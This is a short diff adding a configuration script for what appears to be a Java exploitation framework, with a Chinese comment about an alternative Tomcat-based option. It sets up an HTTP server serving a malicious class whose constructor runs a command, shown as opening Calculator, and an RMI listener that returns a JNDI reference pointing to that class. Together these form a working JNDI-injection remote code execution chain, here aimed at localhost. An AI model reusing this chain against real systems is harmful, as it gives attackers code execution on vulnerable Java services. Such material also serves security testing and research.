@@ -1,0 +1,20 @@
+use exploit SimpleHTTPServer
+use payload EvilFileWrapper
+use bullet ClassWithEvilConstructor
+set lport 8081
+set path /EvilObj.class
+set classname EvilObj
+set body "open -a Calculator"
+set type class
+run
+
+use exploit RMIRefListener
+use payload JNDIRefWrapper
+use bullet JNDIRefBullet
+set lhost 127.0.0.1
+set lport 1099
+set objectName EvilObj
+set factoryName EvilObj
+set factoryURL http://127.0.0.1:8081/
+run
+# 如果选用TomcatRefBullet，则不需要前面的SimpleHTTPServer
